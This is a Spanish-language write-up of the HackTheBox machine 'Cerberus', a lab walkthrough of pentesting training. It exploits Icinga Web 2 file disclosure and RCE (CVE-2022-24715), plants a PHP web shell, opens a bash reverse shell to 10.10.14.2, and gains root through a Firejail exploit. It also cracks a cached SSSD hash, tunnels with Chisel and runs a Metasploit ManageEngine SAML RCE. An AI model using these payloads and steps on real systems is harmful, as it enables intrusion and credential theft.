---
layout: single
title: Cerberus - HackTheBox
excerpt: " Una máquina desafiante en la que explotaremos un Icinga Web 2 y abusaremos de Firejail como también de un remote port forwarding. "
date: 2023-08-14
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-cerberus/cerberus.png
  teaser_home_page: true
  icon: /blog/assets/images/HTB.webp
categories:
  - hackthebox
tags:
  - Windows
  - Firejail
  - Icinga
  - Port Forwarding
  - Container
  - Bash
---

Una máquina desafiante en la que explotaremos un "Icinga Web 2" y abusaremos de Firejail como también de un remote port forwarding.

# Summary
- IP: 10.10.11.205
- Ports: 8080
- OS: WIndows
- Services & Applications:
	-  8080 -> Apache httpd 2.4.52

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.205 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

```bash
$sudo nmap -p8080 -sCV 10.10.11.205 -oN targeted
``` 

- Al observar que solo tiene un puerto abierto y es http, podemos deducir que la intrusión será vía web.


# Análisis de página web (port 8080):

- Al entrar a la web principal, nos redirige a la dirección "icinga.cerberus.local" así que agregamos tanto el dominio como el subdominio al "/etc/hosts".

- Al cargar correctamente la web, vemos que se trata de "Icinga Web 2" y nos muestra una página de login, intentamos con credenciales por defecto pero no funciona.

- Buscamos con searchsploit algo relacionado con "Icinga Web 2" y nos arroja lo siguiente:

 ```js
 $searchsploit icinga web 2

Icinga Web 2.10 - Arbitrary File Disclosure                                                                                                          | php/webapps/51329.py
```

- Como vemos hay un "Arbitrary File Disclosure" en esta web, leemos la script en python para saber qué es lo que hace por detrás y nos damos cuenta que utilizando la siguiente URL podemos leer archivos locales del sistemas en el que está ejecutándose icinga:

```js
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/{Archivo local del sistema}
```

- Probamos desde la linea de comandos:

```bash
curl "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
```

- Como vemos, hemos sido capaces de leer el archivo "/etc/passwd" de la máquina víctima, lo que significa que el sistema de Icinga Web 2 usado sí que es vulnerable.

- Sin embargo hay que darnos cuenta de algo, y es que se supone que la máquina Cerberus es una WIndows, por lo que no debería existir el archivo "/etc/passwd" en una Windows, lo que nos indicaría que estamos realizando la comunicación con un contenedor que está corriendo Linux por detrás; para corroborar esto leemos el archivo "/etc/hosts":

```bash
curl "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts"

127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```


- Tal y como sospechábamos, la dirección IP es diferente a la de la máquina víctima real, por lo que podemos afirmar que estamos ante un contenedor que tiene la dirección "172.16.22.1" y que también está apuntando a un DC, el cual debería ser la máquina Windows.

- En este punto, debemos hacer un reconocimiento o búsqueda de información útil que nos pueda brindar acceso al sistema; como se trata de un Icinga Web 2, lo que sería factible de hacer es leer los archivos de configuración de Icinga; si hacemos una búsqueda en Internet podemos encontrar las posbiles rutas de estos archivos:

```js
/etc/icingaweb2/resources.ini
/etc/icingaweb2/roles.ini
/etc/icingaweb2/config.ini
```


- Probamos leyendo cada uno de estos archivos:

```bash
curl "http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini"

[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"
```

- Como podemos ver, el archivo "resources.ini" efectivamente existe y contiene información que al parecer corresponden al usuario y contraseña de la base de datos de Icinga Web 2.

- Probamos estas credenciales para logearnos en la página web principal de Icinga y accedemos como el usuario "matthew"

# Icinga Web 2 RCE (CVE-2022-24715)

- Si buscamos en internet vulnerabilidades de Icinga Web 2 estando ya autenticado encontraremos el siguiente repositorio apuntando al CVE-2022-24715:  https://github.com/JacobEbben/CVE-2022-24715 

- Se trata de un RCE el cual se lo explota con una script de Python, pero nosotros lo haremos de forma manual así que abrimos la script para entender qué hace por detrás.

- Luego de analizar la script podemos concluir en los siguientes pasos para explotar el RCE  de forma manual.

	- Nos vamos a Configuration/Access Control/Users y añadimos un usuario cualquiera, (en este caso "dante")
	- Nos dirigimos a "Application/General" y cambiamos el "Module Path" por "/dev/" y damos en "Save Changes"
	- Nos vamos a "Modules" y activamos el módulo "shm"
	- En  "/Application/Resources" creamos un nuevo recurso de tipo "SSH Identity"
	- En "Resource name" le podemos cualquiera en formato .php (en este caso pwned.php)
	- En "User" le ponemos el siguiente path traversal "../../../../../../../dev/shm/run.php"
	- Y finalmente en "Private Key" le ponemos una key privada válida de SSH (La podemos crear nosotros mismos en nuestra máquina atacante, comandos explicados más adelante) seguido de un salto de linea y la siguiente cadena: \x00 <?php passthru($_GET['cmd']); ?>

####  Crear una Private Key de SSH:

```bash
$ssh-keygen
$openssl rsa -in /home/usuario/.ssh/id_rsa -outform PEM > /ruta/a/nueva/clave_rsa
```

- Luego de hacer click en "Save changes" cargará el dashboard y si ahora hacemos una petición usando el parámetro "cmd" para ejecutar comandos del sistema veremos que el RCE se ejecuta de forma exitosa.

```js
http://icinga.cerberus.local:8080/icingaweb2/dashboard?cmd=whoami
```

- Ahora nos entablamos una reverse shell usando el RCE obtenido:

```js
http://icinga.cerberus.local:8080/icingaweb2/dashboard?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"
```

- Ganamos acceso al contenedor, hacemos el respectivo tratamiento de la tty para poder movernos con mayor comodidad.

- En este punto debemos buscar la forma de escapar del contenedor, pero en primer lugar buscamos si hay manera de escalar privilegios y tener acceso total del contenedor.



# Explotación de binario Firejail

- Buscamos binarios con permisos SUID:

```js
$find / -perm -4000 2>/dev/null

/usr/sbin/ccreds_chkpwd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/firejail
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/ksu
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

- Nos llama la atención el binario "Firejail", si buscamos en internet vulnerabilidades sobre este binario encontramos el siguiente repositorio: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

- Se trata de una script en Python que abusa de las funcionalidades de Firejail y que al parecer sirve para convertirnos directamente en el usuario root. Descargamos la script y la transferimos al contenedor y le otorgamos permisos de ejecución "chmod +x exploit.py"

- SI la ejecutamos nos dice que ejecutemos "su -" en otra terminal, por lo que debemos entablarnos otra shell del contenedor, lo podemos hacer rápidamente usando el RCE de Icinga que habíamos vulnerado.

- Con la segunda terminal ya abierta, ahora sí procedemos a ejecutar la script en la primera terminal y vemos el siguiente mensaje:

```bash
$python3 exploit.py
```

You can now run 'firejail --join=25497' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.

- En la segunda terminal ejecutamos los comandos:

```bash
$firejail --join=25497
$su -
```

- Y ya seremos root en el contenedor.

- Como root podemos enumerar en búsqueda de archivos que contengan credenciales cacheadas, anteriormente vimos que el contenedor está enlazado a un DC el cual sería la máquina Windows, podríamos leer el archivo que contiene información del DC:

```js
cat /etc/sssd/sssd.conf

[sssd]
domains = cerberus.local
config_file_version = 2
services = nss, pam

[domain/cerberus.local]
default_shell = /bin/bash
ad_server = cerberus.local
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = CERBERUS.LOCAL
realmd_tags = manages-system joined-with-adcli 
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = cerberus.local
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad
```

- Podemos notar que "krb5_store_password_if_offline" está en "true", lo que significa que las contraseñas de kerberos se almacenan de forma local (offline) en el sistema, sabiendo  que en sistemas Linux, las contraseñas y los tickets de Kerberos en caché generados por SSSD suelen almacenarse en el directorio "/var/lib/sss/db/", nos dirigimos a ese directorio y listamos los archivos:

```js
$cd /var/lib/sss/db/
$ls -la

ls -la
total 5036
drwx------  2 root root    4096 Mar  2 12:33 .
drwxr-xr-x 10 root root    4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1286144 Jul 26 04:24 cache_cerberus.local.ldb
-rw-------  1 root root    2715 Mar  2 12:33 ccache_CERBERUS.LOCAL
-rw-------  1 root root 1286144 Jul 26 07:53 config.ldb
-rw-------  1 root root 1286144 Jan 22  2023 sssd.ldb
-rw-r--r--  1 root root 1286144 Mar  1 12:07 timestamps_cerberus.local.ldb
```

- Leemos con cat el contenido de "cache_cerberus.local.ldb" pero nos arroja demasiada información desordenada, si usamos "strings" podemos visualizar de mejor forma y encontramos un hash:

```js
$strings cache_cerberus.local.ldb 

(...snip...)
dataExpireTimestamp
initgrExpireTimestamp
cachedPassword
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU
(...snip...)
```

- Crackeamos este hash con John y encontramos una contraseña para el usuario "matthew".


# Bash scripting:

- Ahora podríamos enumerar los puertos abiertos en el contenedor creando una sencilla script en bash:


```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[i] Saliendo...\n"
        tput cnorm; exit 1
}

#Ctrl+C
trap ctrl_c INT

tput civis

for port in $(seq 1 65535);do

        timeout 1 bash -c "echo '' > /dev/tcp/172.16.22.1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &

done; wait

tput cnorm
```


- Ejecutamos la script:

```bash
./escaneo_puertos.sh 2>/dev/null
[+] Port 5985 - OPEN
```


# Abuso de WinRM (Evil-Winrm) INTRUSIÓN:

- Vemos que está abierto el puerto 5985, el cual generalmente se trata del servicio "WinRM", lo que permitiría establecer una conexión remota a una shell de Windows, por lo que nos interesa poder interactuar con este puerto, para esto, hacemos un remote port forwarding con "Chisel" para crear un túnel y poder comunicarnos con el puerto 5985 desde nuestra máquina atacante:

##### En máquina atacante:

```bash
./chisel server -p 8000 --reverse
```


##### En máquina víctima:


```bash
./chisel client 10.10.14.2:8000 R:5985:172.16.22.1:5985
```


- Y ahora intentamos conectarnos usando "evil-winrm" como el usuario "matthew" usando la contraseña que habíamos crackeado:

```bash
$evil-winrm -i 10.10.14.2 -u matthew -p 147258369
```


# ESCALADA DE PRIVILEGIOS:

# ADSelfService Plus SAML RCE (CVE-2022-47966).
- Habremos accedido al sistema Windows como el usuario "matthew", como podremos notar si hacemos un "ipconfig" hay dos interfaces, la que pertenece a la IP real de la máquina y la otra a la del contenedor.

- Si vamos al directorio "/Program Files (x86)" vemos una carpeta poco común ("ManageEngine"), entramos y vemos otra carpeta llamada "ADSelfService Plus"

- Buscamos en internet qué es "ADSelfService Plus" y en qué puertos funciona de forma predeterminada.

- Descubrimos que esta aplicación por defecto usa los puertos 80 y 443 para sus conexiones http y https respectivamente, además, si entramos al directorio "C:\Program Files (x86)\ManageEngine\ADSelfService Plus\conf" y leemos el archivo "server.xml" podremos ver más información de la aplicación sobre la máquina víctima.

- En este caso, al final de ese archivo vemos lo siguiente:

```xml
<Connector SSLEnabled="true" acceptCount="100" ciphers="TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA" clientAuth="false" debug="0" disableUploadTimeout="true" enableLookups="false" keystoreFile="conf/server.p12" keystorePass="CertPass2023" keystoreType="PKCS12" maxSpareThreads="75" maxThreads="150" minSpareThreads="25" name="SSL" port="9251" relaxedQueryChars="\" scheme="https" secure="true" sslEnabledProtocols="TLSv1,TLSv1.1,TLSv1.2" sslProtocol="TLS"/>
```


- Vemos que está teóricamente utilizando el puerto "9251".

- Listamos los puertos en uso de la máquina:

```bash
$netstat -ano -p TCP
```

- Podemos confirmar que el puerto "9251" está siendo utilizado por la máquina.

- Con toda esta información, hacemos un túnel de todos los puertos de esta máquina Windows a nuestra máquina atacante para poder interactuar con esta aplicación:


###### En máquina atacante:

```bash
./chisel server -p 1234 --socks5 --reverse
```

###### En máquina víctima:

```bash
./chisel client 10.10.14.2:1234 R:socks
```


- Ahora verificamos en el navegador qué hay en la dirección local en el puerto 9251 (usando el protocolo socks5, se puede usar FoxyProxy para establecer el proxy):

```js
http://localhost:9251
```

- Nos redirige a la dirección "dc.cerberus.local", lo agregamos el "/etc/hosts" apuntando con la dirección local "127.0.0.1"

- Volvemos a cargar la página y vemos un login, accedemos como usuario "cerberus.local\matthew" usando la misma contraseña de WinRM

- Notamos que no nos muestra nada, sin embargo en la URL nos filtra una GUID:

```js
https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
```

- Verificamos la SAML response, para esto abrimos las opciones de desarrollador (Ctrl+shift+K en Firefox) y nos ubicamos en la pestaña de "Network", ahora nos volvemos a logear en la página y la pestaña en la que estamos ubicamos veremos en el inicio un recurso, si hacemos click en este en el lado derecho nos debería reportar la "SAMLResponse", estará codificada en base64, la decodificamos y vemos el siguiente contenido:


```xml
<samlp:Response ID="_1c489b80-6079-459d-b4e2-f6c56cb331ff" Version="2.0" IssueInstant="2023-07-26T22:44:28.110Z" Destination="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_3b0a6ec0bad55aa0428c1fbd2d5d87c9" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://dc.cerberus.local/adfs/services/trust</Issuer>
```

- Vemos que hay una dirección de "Issuer", esto nos servirá luego.


- Usamos Metasploit para buscar como explotar la aplicación "ADSelfService Plus" y encontramos lo siguiente:

```js
search adself

Matching Modules
================

   #  Name                                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                                        ---------------  ----       -----  -----------
   0  exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539         2021-09-07       excellent  Yes    ManageEngine ADSelfService Plus CVE-2021-40539
   1  exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810         2022-04-09       excellent  Yes    ManageEngine ADSelfService Plus Custom Script Execution
   2  exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966  2023-01-10       excellent  Yes    ManageEngine ADSelfService Plus Unauthenticated SAML RCE
```

- Vemos que hay un RCE, utilizamos esa exploit y verificamos las opciones necesarias:

```js
$use 2
$show options
```


- Seteamos las opciones necesarias para que se ejecute el exploit, utilizando la información que hemos recolectado hasta ahora y usando como proxy el SOCKS5 que estamos usando para tunelizar todos los puertos de la máquina víctima:


```js
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
GUID => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set Proxies SOCKS5:127.0.0.1:1080
Proxies => SOCKS5:127.0.0.1:1080
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set LHOST tun0
LHOST => 10.10.14.2
[msf](Jobs:0 Agents:0) exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) >> set ReverseAllowProxy true
```

- Finalmente ejecutamos "run" y ya se nos desplegaría un meterpreter como el usuario "Administrator", con el comando "shell" podemos abrir una cmd de Windows y podremos buscar la última flag.
